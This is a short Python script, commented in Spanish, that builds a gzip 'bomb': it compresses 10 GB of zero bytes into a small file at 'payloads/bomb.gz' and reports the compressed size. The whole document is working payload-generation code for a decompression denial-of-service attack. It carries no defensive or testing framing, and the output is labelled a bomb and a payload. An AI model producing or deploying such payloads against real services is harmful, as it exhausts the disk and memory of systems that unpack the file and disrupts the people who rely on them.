import gzip
import os

def create_gzip_bomb(target_file, size_gb=10):
    print(f"[💣] Generando Gzip Bomb de {size_gb}GB...")
    # Bloque de 1MB de ceros
    buffer = b"\x00" * (1024 * 1024)
    
    with gzip.open(target_file, "wb", compresslevel=9) as f:
        for _ in range(size_gb * 1024):
            f.write(buffer)
            
    print(f"[✔] Bomba creada exitosamente en: {target_file}")
    print(f"[i] Tamaño comprimido: {os.path.getsize(target_file) / 1024:.2f} KB")

if __name__ == "__main__":
    os.makedirs("payloads", exist_ok=True)
    create_gzip_bomb("payloads/bomb.gz", size_gb=10)
